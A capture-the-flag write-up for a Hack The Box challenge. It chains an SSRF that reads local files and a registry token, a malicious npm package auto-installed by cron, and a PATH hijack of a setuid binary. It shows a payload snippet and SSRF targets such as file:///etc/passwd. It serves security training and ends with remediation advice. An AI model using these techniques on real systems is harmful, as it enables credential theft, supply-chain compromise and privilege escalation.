---
title: misc/prison-pipeline
platform: HTB
event: try-out
category: misc
tags: [ssrf, supply-chain, npm, path-hijack, setuid]
status: solved
---

# Write-up: misc_prison_pipeline

**Flag:** `HTB{pr1s0n_br34k_w1th_supply_ch41n!_REDACTED}`

**Target:** `<target>` (HTB challenge instance)
**Script:** `artifacts/solve.py`, run with `python3 solve.py <target_ip> <target_port> --version 1.0.5`

## Summary

The web app has an SSRF in its prisoner import endpoint. Through the SSRF, the attacker can read local files with `file://` (but cannot read `/root/flag` directly), read the token of the private npm registry from `/home/node/.npmrc`, and publish a malicious version of the `prisoner-db` package. A cronjob runs `npm update` and `pm2 restart` on the app every 30 seconds, so the payload in the package runs as user `node`. The payload puts a fake `cat` on `PATH` and calls `/readflag` (setuid root), which copies `/root/flag` to `/tmp/flag_out`. The attacker then reads `/tmp/flag_out` through the SSRF.

Attack chain: **SSRF → read registry token → publish malicious package → supply chain (automatic npm update) → code execution as `node` → PATH hijack of `/readflag` (setuid) → read flag.**

## Source code review

Scope: `challenge/application/` (Express app), `challenge/prisoner-db/` (internal npm module), `config/` (`readflag.c`, `cronjob.sh`, `setup-registry.sh`, `verdaccio.yaml`, `nginx.conf`, `supervisord.conf`) and the `Dockerfile`.

First I searched for sensitive sinks: outbound requests (`curl`), file reads (`readFile*`), command execution (`exec*`, `system`, `spawn`), paths built from input, and permission/token configuration. Then I read each suspicious spot in full.

### Suspicious code

| # | Location | Suspicious code | Severity | Assessment |
|---|---|---|---|---|
| 1 | `challenge/prisoner-db/index.js`, `importPrisoner()`, and `challenge/prisoner-db/curl.js`, `_request()` | `curl.get(url)` accepts any URL, `FOLLOWLOCATION = true`, no scheme or host check | **High** | SSRF: reads `file://` and internal services (`127.0.0.1:5000`, `4873`). Confirmed by testing |
| 2 | `challenge/application/routes/index.js`, lines 27–44 | `POST /api/prisoners/import` only checks that `url` exists; `GET /api/prisoners/:id` returns the raw content | **High** | Data channel: content read through the SSRF is stored as a prisoner and read back with `GET`. Combined with #1 |
| 3 | `/home/node/.npmrc` (readable via #1) | Contains the `_authToken` of user `registry`, which can publish | **High** | The secret sits in a file the app process (user `node`) can read, so the SSRF can read the token |
| 4 | `config/cronjob.sh` | Loop every 30 seconds: `npm update prisoner-db` then `pm2 restart`, no pinned version and no integrity check | **High** | Supply chain: a version published to the internal registry is installed and executed in the app automatically |
| 5 | `config/verdaccio.yaml`, `packages: 'prisoner-*'` | `publish: $authenticated`, no per-user restriction on who can publish | **Medium** | Anyone with a valid token can publish. Severity depends on #3 |
| 6 | `config/readflag.c` | `setuid(0)` then `system("cat /root/flag")` calls `cat` by relative name | **High** | PATH hijack: a setuid-root binary runs `cat` found through the caller's `PATH`, and the caller can set `PATH` |
| 7 | `config/nginx.conf`, default `server` on port 1337 | `proxy_pass http://localhost:5000/` for every path; the app listens on `0.0.0.0:5000` | **Low** | Increases the attack surface, but does not cause a bug by itself. It is the internal target for #1 |
| 8 | `challenge/prisoner-db/curl.js`, `CurlWrapper` | No timeout; `new Curl()` in the constructor is never used | **Low** | Requests can hang. Does not affect the main chain |
| 9 | `config/cronjob.sh`, line 5 | `chmod 600 /home/node/.config/cronjob.sh`: the file does not exist, so the line does nothing | **Info** | Leftover from an earlier edit, no impact |
| 10 | `challenge/prisoner-db/index.js`, `importPrisoner()` | Errors are swallowed in `catch`; the route still returns 200 with `prisoner_id: false` | **Info** | No security impact |

### Ruled out

- `getPrisoner(id)` is not vulnerable to path traversal: `id` must be in `index.json` (`includes`) before the path is built.
- The Express error handler returns a generic message and does not leak stack traces.
- `readflag` is built in the Dockerfile with `chmod 4755`, and `flag.txt` is at `/root/flag` with root-only permissions. So only `readflag` can read the flag, not the file itself.

### Chosen bug for exploit testing: #1 SSRF

**Reason:** it is the only entry point that needs no authentication. Everything after it depends on it: #3 (read token), #5 (publish), #4 (run code in the app), #6 (escalate to root).

**Test:**

The test ran during the successful PoC run on instance `<target>`, in the `verify_ssrf` step:

| Target | Result |
|---|---|
| `http://127.0.0.1:5000/api/prisoners` (internal service) | OK, returns data containing `PIP-` |
| `file:///etc/passwd` | OK, contains `root:x:0:0` |
| `file:///root/flag` | Blocked (expected: the app process does not have root privileges) |

After that, `file:///home/node/.npmrc` returned the registry token, and the exploit chain completed with the flag above.

**Note:** a repeat test of the same paths was not possible because instance `32679` has stopped running (`Connection refused`). The results above come from the earlier run, not from a repeat.

## Steps

### 1. Verify the SSRF

`POST /api/prisoners/import` with `{"url": ...}`, then `GET /api/prisoners/<id>` to read the content back. The app uses `node-libcurl`, which accepts both `http://` and `file://`.

- `http://127.0.0.1:5000/api/prisoners` → readable (internal service).
- `file:///etc/passwd` → readable.
- `file:///root/flag` → not readable (the expected permission block: the app process runs as user `node`).

### 2. Get the registry token

`file:///home/node/.npmrc` contains the `_authToken` of user `registry` on Verdaccio. The token is checked with `GET /-/whoami` (read-only) and returns `registry`.

### 3. Publish the malicious package

The registry runs behind nginx and is routed by the `Host: registry.prison-pipeline.htb` header. The script builds a tarball of `prisoner-db@<version>` containing:

- `package.json` with the original dependencies (`js-yaml`, `node-libcurl`).
- `index.js` = payload + original `prisoner-db` code. The payload runs as soon as the module is `require`d:

  ```js
  fs.writeFileSync('/tmp/pwn/cat', '#!/bin/sh\ncp /root/flag /tmp/flag_out && chmod 644 /tmp/flag_out\n');
  execSync('PATH=/tmp/pwn:$PATH /readflag', {...});
  ```

- `curl.js` (original file; required because `index.js` calls `require('./curl')`).

Publish with `PUT /prisoner-db` using the token from step 2. The manifest must include `dist.tarball`, otherwise Verdaccio cannot read the packument back (returns 500).

### 4. Trigger

`cronjob.sh` runs a loop every 30 seconds:

```bash
OUTDATED=$(npm --registry http://localhost:4873 outdated prisoner-db)
if [[ -n "$OUTDATED" ]]; then
    npm --registry $REGISTRY_URL update prisoner-db
    pm2 restart prison-pipeline
fi
```

Once `1.0.5` is `latest`, cron updates `/app/node_modules/prisoner-db` and restarts the app. The app `require`s `prisoner-db` in `routes/index.js`, so the payload runs as user `node`.

### 5. PATH hijack of `/readflag`

`/readflag` (`config/readflag.c`) is a setuid-root binary that calls `setuid(0)` and then `system("cat /root/flag")`. `system()` looks up `cat` through `PATH`, and the payload puts `/tmp/pwn` first in `PATH`. The fake `cat` therefore runs with euid 0 and copies the flag.

### 6. Read the flag

`file:///tmp/flag_out` read through the SSRF returns the flag contents.

## Problems hit while building the PoC

These bugs were in the PoC, not in the challenge. They are recorded here to reproduce them and to explain why the first run did not return the flag.

| # | Symptom | Cause | Fix |
|---|---|---|---|
| 1 | `FileNotFoundError` right after the token check | `ORIGINAL_INDEX` had one extra `misc_prison_pipeline/` level | Point to `../challenge/prisoner-db/index.js` |
| 2 | Publish succeeded but 12 polls did not return the flag | The manifest lacked `dist.tarball`. The packument returned 500, so `npm outdated` never saw the new version and cron never updated | Add `"tarball": f"http://{HOST_HEADER}/{PKG}/-/{tarname}"` to `dist`. Verdaccio rewrites the URL to the serving host |
| 3 | App returned 502 after the update; SSRF stopped working | The tarball lacked `curl.js`. `index.js` calls `require('./curl')`, so the module failed to load and the app crashed | `build_tarball()` now includes `curl.js` |

Note on problem 3: the payload runs before the failing `require`, so `/tmp/flag_out` may already exist even when the app crashes. The app can be broken and the flag can still be retrievable, as long as the SSRF still works.

**Note on instances:** after a bad publish, the `prisoner-db` packument keeps the broken version in the registry, and publishing a new version does not remove it. This was verified on a local Verdaccio. A new instance is required after a bad publish.

## Verification

- Ran the fixed PoC on instance `32679` with `--version 1.0.5`: publish returned 201, cron updated and restarted the app, and the flag was returned on the first poll.
- The fixed tarball was checked locally: it contains `package.json`, `index.js`, and `curl.js`. `require('prisoner-db')` loads, and the payload creates `/tmp/pwn/cat`. This check used a stub for `node-libcurl`, because the real package does not build on the Node 24 used for the check.

## Remediation (if this were a real system)

- Restrict the SSRF: block `file://` and block access to `127.0.0.1` from the import endpoint.
- Do not store a token with publish rights in a file the app process can read.
- Do not `npm update` and `pm2 restart` from an internal registry without checking signatures or versions. Pin dependencies and require a separate publish role for CI.
- `/readflag` should not be setuid root, and `system()` should not be called with a relative command name.
